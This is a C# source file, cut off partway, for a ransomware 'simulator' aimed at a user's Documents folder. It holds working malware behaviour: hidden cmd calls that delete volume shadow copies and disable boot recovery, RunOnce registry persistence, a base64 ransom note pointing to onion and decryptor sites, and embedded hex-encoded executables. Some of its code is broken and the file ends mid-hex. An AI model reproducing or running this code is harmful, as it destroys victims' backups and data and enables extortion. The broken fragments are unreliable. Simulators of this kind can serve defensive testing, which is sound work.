using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Ransimware;

public class Ransimware
{
	private CspParameters cspp = new CspParameters();

	private RSACryptoServiceProvider rsa;

	private const string keyName = "4agrfsh5tx7";

	private const string ransomNote = "LS0tPT09IFdlbGNvbWUuIEFnYWluLiA9PT0tLS0NCg0KWytdIFdoYXRzIEhhcHBlbj8gWytdDQoNCllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCwgYW5kIGN1cnJlbnRseSB1bmF2YWlsYWJsZS4gWW91IGNhbiBjaGVjayBpdDogYWxsIGZpbGVzIG9uIHlvdSBjb21wdXRlciBoYXMgZXhwYW5zaW9uIHtFWFR9Lg0KQnkgdGhlIHdheSwgZXZlcnl0aGluZyBpcyBwb3NzaWJsZSB0byByZWNvdmVyIChyZXN0b3JlKSwgYnV0IHlvdSBuZWVkIHRvIGZvbGxvdyBvdXIgaW5zdHJ1Y3Rpb25zLiBPdGhlcndpc2UsIHlvdSBjYW50IHJldHVybiB5b3VyIGRhdGEgKE5FVkVSKS4NCg0KWytdIFdoYXQgZ3VhcmFudGVlcz8gWytdDQoNCkl0cyBqdXN0IGEgYnVzaW5lc3MuIFdlIGFic29sdXRlbHkgZG8gbm90IGNhcmUgYWJvdXQgeW91IGFuZCB5b3VyIGRlYWxzLCBleGNlcHQgZ2V0dGluZyBiZW5lZml0cy4gSWYgd2UgZG8gbm90IGRvIG91ciB3b3JrIGFuZCBsaWFiaWxpdGllcyAtIG5vYm9keSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCB1cy4gSXRzIG5vdCBpbiBvdXIgaW50ZXJlc3RzLg0KVG8gY2hlY2sgdGhlIGFiaWxpdHkgb2YgcmV0dXJuaW5nIGZpbGVzLCBZb3Ugc2hvdWxkIGdvIHRvIG91ciB3ZWJzaXRlLiBUaGVyZSB5b3UgY2FuIGRlY3J5cHQgb25lIGZpbGUgZm9yIGZyZWUuIFRoYXQgaXMgb3VyIGd1YXJhbnRlZS4NCklmIHlvdSB3aWxsIG5vdCBjb29wZXJhdGUgd2l0aCBvdXIgc2VydmljZSAtIGZvciB1cywgaXRzIGRvZXMgbm90IG1hdHRlci4gQnV0IHlvdSB3aWxsIGxvc2UgeW91ciB0aW1lIGFuZCBkYXRhLCBjYXVzZSBqdXN0IHdlIGhhdmUgdGhlIHByaXZhdGUga2V5LiBJbiBwcmFjdGlzZSAtIHRpbWUgaXMgbXVjaCBtb3JlIHZhbHVhYmxlIHRoYW4gbW9uZXkuDQoNClsrXSBIb3cgdG8gZ2V0IGFjY2VzcyBvbiB3ZWJzaXRlPyBbK10NCg0KWW91IGhhdmUgdHdvIHdheXM6DQoNCjEpIFtSZWNvbW1lbmRlZF0gVXNpbmcgYSBUT1IgYnJvd3NlciENCiAgYSkgRG93bmxvYWQgYW5kIGluc3RhbGwgVE9SIGJyb3dzZXIgZnJvbSB0aGlzIHNpdGU6IGh0dHBzOi8vdG9ycHJvamVjdC5vcmcvDQogIGIpIE9wZW4gb3VyIHdlYnNpdGU6IGh0dHA6Ly93d3lsZ2N2ZWdwMzN0Mnl0bnNxYTZrbHJvcTNrejY0M3E1Y2VpbmtxYjd4NjIzMmczZ3VpdDJpZC5vbmlvbg0KDQoyKSBJZiBUT1IgYmxvY2tlZCBpbiB5b3VyIGNvdW50cnksIHRyeSB0byB1c2UgVlBOISBCdXQgeW91IGNhbiB1c2Ugb3VyIHNlY29uZGFyeSB3ZWJzaXRlLiBGb3IgdGhpczoNCiAgYSkgT3BlbiB5b3VyIGFueSBicm93c2VyIChDaHJvbWUsIEZpcmVmb3gsIE9wZXJhLCBJRSwgRWRnZSkNCiAgYikgT3BlbiBvdXIgc2Vjb25kYXJ5IHdlYnNpdGU6IGh0dHA6Ly9kZWNyeXB0b3IudG9wLzkxM0FFRDBCNUZFMTQ5N0QNCg0KV2FybmluZzogc2Vjb25kYXJ5IHdlYnNpdGUgY2FuIGJlIGJsb2NrZWQsIHRoYXRzIHdoeSBmaXJzdCB2YXJpYW50IG11Y2ggYmV0dGVyIGFuZCBtb3JlIGF2YWlsYWJsZS4NCg0KV2hlbiB5b3Ugb3BlbiBvdXIgd2Vic2l0ZSwgcHV0IHRoZSBmb2xsb3dpbmcgZGF0YSBpbiB0aGUgaW5wdXQgZm9ybToNCktleToNCg0Ke0tFWX0NCg0KRXh0ZW5zaW9uIG5hbWU6DQoNCntFWFR9DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiEhISBEQU5HRVIgISEhDQpET05UIHRyeSB0byBjaGFuZ2UgZmlsZXMgYnkgeW91cnNlbGYsIERPTlQgdXNlIGFueSB0aGlyZCBwYXJ0eSBzb2Z0d2FyZSBmb3IgcmVzdG9yaW5nIHlvdXIgZGF0YSBvciBhbnRpdmlydXMgc29sdXRpb25zIC0gaXRzIG1heSBlbnRhaWwgZGFtZ2Ugb2YgdGhlIHByaXZhdGUga2V5IGFuZCwgYXMgcmVzdWx0LCBUaGUgTG9zcyBhbGwgZGF0YS4NCiEhISAhISEgISEhDQpPTkUgTU9SRSBUSU1FOiBJdHMgaW4geW91ciBpbnRlcmVzdHMgdG8gZ2V0IHlvdXIgZmlsZXMgYmFjay4gRnJvbSBvdXIgc2lkZSwgd2UgKHRoZSBiZXN0IHNwZWNpYWxpc3RzKSBtYWtlIGV2ZXJ5dGhpbmcgZm9yIHJlc3RvcmluZywgYnV0IHBsZWFzZSBzaG91bGQgbm90IGludGVyZmVyZS4NCiEhISAhISEgISEh";

	private const string getRelayHex = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DFF6BE830000000000000000E00022000B013000001E00000008000000000000EA3C0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000953C00004F00000000400000E405000000000000000000000000000000000000006000000C000000FC3B0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F01C000000200000001E000000020000000000000000000000000000200000602E72737263000000E4050000004000000006000000200000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000002600000000000000000000000000004000004200000000000000000000000000000000C93C0000000000004800000002000500CC200000280700000300020001000006F427000008140000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000003C020000237E0000A8020000D402000023537472696E6773000000007C0500004000000023555300BC050000100000002347554944000000CC0500005C01000023426C6F620000000000000002000001471502000901000000FA0133001600000100000017000000020000000200000001000000160000000E000000010000000100000002000000010000000000CB01010000000000060037017A020600A4017A0206006B0048020F009A02000006009300180206001A0118020600FB00180206008B0118020600570118020600700118020600AA00180206007F005B0206005D005B020600DE0018020600C500D8010600AE020C020A00C002B50206002A0210000A003E00B5020600FD011000060037021000060001000C02060023000C020000000007000000000001000100000010000402CB024100010001005020000000009100130252000100C42000000000861842020600020000000100A902090042020100110042020600190042020A0029004202100031004202100039004202100041004202100049004202100051004202100059004202100061004202150069004202100071004202100079004202100089005600230089004A0029009900F2012E00910042023300A9002B003900B90034003D00B900340044008100420206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000CB02000004000000000000000000000049001A000000000004000000000000000000000049000C02000000000000000001000000C2010000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E67657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C6179000001000F7B0030007D003A007B0031007D00002B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C002E000000E469C7ECA0C6424A884684CEAA5BFE2A00042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E5342422043464620464653204147000025010020436F7079726967687420C2A9205342422043464620464653204147203230323100002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32001400004D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103000D080CC60000000000000000E00022000B013000000A00000008000000000000DA280000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000852800004F00000000400000E405000000000000000000000000000000000000006000000C000000EC270000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000E008000000200000000A000000020000000000000000000000000000200000602E72737263000000E40500000040000000060000000C0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000B9280000000000004800000002000500CC2000002007000003000200010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000002C020000237E000098020000CC02000023537472696E677300000000640500005000000023555300B4050000100000002347554944000000C40500005C01000023426C6F620000000000000002000001471502000900000000FA0133001600000100000017000000020000000200000001000000160000000E0000000100000001000000020000000000C2010100000000000600370171020600A401710206006B003F020F0091020000060093000F0206001A010F020600FB000F0206008B010F02060057010F02060070010F020600AA000F0206007F00520206005D0052020600DE000F020600C500CF010600A50203020A00B702AC020600210210000A003E00AC020600F401100006002E021000060001000302060023000302000000000700000000000100010000001000FB01C20241000100010050200000000091000A0252000100C42000000000861839020600020000000100A002090039020100110039020600190039020A0029003902100031003902100039003902100041003902100049003902100051003902100059003902100061003902150069003902100071003902100079003902100089005600230089004A0029009900E9012E00910039023300A9002B003900B90034003D00B900340044008100390206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000C202000004000000000000000000000049001A00000000000400000000000000000000004900030200000000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C617900000001000F7B0030007D003A007B0031007D00003B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C00200039003800340033007A0065007200710000003BCBAB9B49EDD747B6A9A1E3EA57BF0200042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E2020202020202020202020202020000025010020436F7079726967687420C2A9203230323120202020202020202020202020202000002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3200000000025ABACB00000000020000006100000024280000240A00000000000000000000000000001000000000000000000000000000000052534453709A1FBD540EAC47998F3D84A75EDC410100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000AD2800000000000000000000C7280000002000000000000000000000000000000000000000000000B9280000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E00650074003100200020002000200000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9002000320030003200310020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000002000000C000000DC380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007B7909D2000000000200000061000000343C0000341E000000000000000000000000000010000000000000000000000000000000525344539571E5573D850E46949C412D70C81A150100000020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202000BD3C00000000000000000000D73C0000002000000000000000000000000000000000000000000000C93C0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000000000FF2500204000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200100000002000008018000000500000800000000000000000000000000000010001000000380000800000000000000000000000000000010000000000800000000000000000000000000000000000010001000000680000800000000000000000000000000000010000000000E403000090400000540300000000000000000000540334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004B4020000010053007400720069006E006700460069006C00650049006E0066006F0000009002000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E00740073000000000000003E000F00010043006F006D00700061006E0079004E0061006D0065000000000020002000200020002000200020002000200020002000200020002000000000003A0009000100460069006C0065004400650073006300720069007000740069006F006E00000000006E006500740031002E0065007800650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000003A000D00010049006E007400650072006E0061006C004E0061006D00650000006E006500740031002E006500780065002000200020002000000000006400200001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A9003200300032003100200020002000200020002000200020002000200020002000200020002000200000002A00010001004C006500670061006C00540072006100640065006D00610072006B007300000000000000000042000D0001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000006E006500740031002E00650078006500200020002000200000000000320009000100500072006F0064007500630074004E0061006D006500000000006E006500740031002E0065007800650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000F4430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E00000000000000000000000000000000000000000000000000000000000000000000003000000C000000EC3C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";

	private static string username = Environment.UserName;

	private const string fileExt = "4agrfsh5tx7";

	private static string ransomFileName = "4agrfsh5tx7-HOW-TO-DECRYPT.txt";

	private const string getRelayFileName = "net.exe";

	private string SrcFolder = "C:\\Users\\" + username + "\\Documents\\";

	private string ransomNoteDropPath = "C:\\Users\\" + username + "\\Desktop\\" + ransomFileName;

	private string imgDestPath = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\xddsdf.bmp";

	public void Simulate()
	{
		CreateAsmKeys();
		GetPrivateKey();
		Encrypt();
		AddRegistryKeys();
		SetBackgroundImage();
		DropRansomNote();
		RunCommand("netsh advfirewall firewall set rule group==”Network Discovery” new enable=Yes”");
		RunCommand("/C vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		Console.ReadLine();
	}

	public void AddRegistryKeys()
	{
		RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
		registryKey!.SetValue("a8hadofi", "C: \\Users\\" + username + "\\AppData\\Local\\Temp\\" + AppDomain.CurrentDomain.FriendlyName);
		registryKey!.Close();
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\WOW6432Node\\BlackLivesMatter", writable: true);
		registryKey2.OpenSubKey("SOFTWARE\\WOW6432Node\\BlackLivesMatter", writable: true);
		registryKey2.SetValue("96Ia6", Encoding.ASCII.GetBytes("q9c!t8znqpf8#"));
		registryKey2.SetValue("Ed7", Encoding.ASCII.GetBytes("revilransomware"));
		registryKey2.SetValue("JmfOBvhb", Encoding.ASCII.GetBytes("helloworld"));
		registryKey2.SetValue("QIeQ", Encoding.ASCII.GetBytes("infected"));
		registryKey2.SetValue("Ucr1RB", Encoding.ASCII.GetBytes("youhavebeenpwnd"));
		registryKey2.SetValue("wJWsTYE", ".4agrfsh5tx7");
		registryKey2.Close();
		Console.WriteLine("Registry keys added");
	}

	public void RunCommand(string command)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = command;
		process.StartInfo = processStartInfo;
		try
		{
			process.Start();
			Console.WriteLine("Executed command " + command);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}

	private void CreateAsmKeys()
	{
		cspp.KeyContainerName = "4agrfsh5tx7";
		rsa = new RSACryptoServiceProvider(cspp);
		rsa.PersistKeyInCsp = false;
		if (rsa.PublicOnly)
		{
			Console.WriteLine("Key: " + cspp.KeyContainerName + " - Public Only");
		}
		else
		{
			Console.WriteLine("Key: " + cspp.KeyContainerName + " - Full Key Pair");
		}
	}

	private void GetPrivateKey()
	{
		cspp.KeyContainerName = "4agrfsh5tx7";
		rsa = new RSACryptoServiceProvider(cspp);
		rsa.PersistKeyInCsp = true;
		if (rsa.PublicOnly)
		{
			Console.WriteLine("Key: " + cspp.KeyContainerName + " - Public Only");
		}
		else
		{
			Console.WriteLine("Key: " + cspp.KeyContainerName + " - Full Key Pair");
		}
	}

	public void sendGetRequest(string url, int n)
	{
		byte[] array = new byte["4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C010300DFF6BE830000000000000000E00022000B013000001E00000008000000000000EA3C0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000953C00004F00000000400000E405000000000000000000000000000000000000006000000C000000FC3B0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F01C000000200000001E000000020000000000000000000000000000200000602E72737263000000E4050000004000000006000000200000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000002600000000000000000000000000004000004200000000000000000000000000000000C93C0000000000004800000002000500CC200000280700000300020001000006F427000008140000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300300560000000100001102169A280F00000A0A066F1000000A6F1100000A731200000A0B72010000700C160D2B1F0917580D076F1300000A0C082C117203000070098C1600000108281400000A082DDEDE0D267213000070281500000ADE002A000001100000000009003F48000D100000011E02281600000A2A42534A4201000100000000000C00000076342E302E33303331390000000005006C0000003C020000237E0000A8020000D402000023537472696E6773000000007C0500004000000023555300BC050000100000002347554944000000CC0500005C01000023426C6F620000000000000002000001471502000901000000FA0133001600000100000017000000020000000200000001000000160000000E000000010000000100000002000000010000000000CB01010000000000060037017A020600A4017A0206006B0048020F009A02000006009300180206001A0118020600FB00180206008B0118020600570118020600700118020600AA00180206007F005B0206005D005B020600DE0018020600C500D8010600AE020C020A00C002B50206002A0210000A003E00B5020600FD011000060037021000060001000C02060023000C020000000007000000000001000100000010000402CB024100010001005020000000009100130252000100C42000000000861842020600020000000100A902090042020100110042020600190042020A0029004202100031004202100039004202100041004202100049004202100051004202100059004202100061004202150069004202100071004202100079004202100089005600230089004A0029009900F2012E00910042023300A9002B003900B90034003D00B900340044008100420206002E000B0058002E00130061002E001B0080002E00230089002E002B0097002E00330097002E003B009D002E00430089002E004B00B1002E00530097002E005B0097002E006300D7002E006B0001012E0073000E011A00048000000100000000000000000000000000CB02000004000000000000000000000049001A000000000004000000000000000000000049000C02000000000000000001000000C2010000000000496E743332003C4D6F64756C653E0053797374656D2E494F006D73636F726C696200436F6E736F6C6500526561644C696E650057726974654C696E6500576562526573706F6E736500476574526573706F6E73650043726561746500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650067657472656C61792E67657472656C61792E6578650053797374656D2E52756E74696D652E56657273696F6E696E6700476574526573706F6E736553747265616D0050726F6772616D0053797374656D004D61696E0053797374656D2E5265666C656374696F6E0053747265616D5265616465720054657874526561646572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730061726773004F626A6563740053797374656D2E4E657400576562526571756573740067657472656C6179000001000F7B0030007D003A007B0031007D00002B4500720072006F0072002C00200063006800650063006B0020007400680065002000550052004C002E000000E469C7ECA0C6424A884684CEAA5BFE2A00042001010803200001052001011111042001010E0420010102080704124512490E0805000112450E042000124D04200012510520010112510320000E060003010E1C1C040001010E08B77A5C561934E089050001011D0E0801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000000D01000867657472656C617900000501000000001301000E5342422043464620464653204147000025010020436F7079726967687420C2A9205342422043464620464653204147203230323100002901002466396130363765352D643866622D346632612D623061642D64323165393864376232333800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B44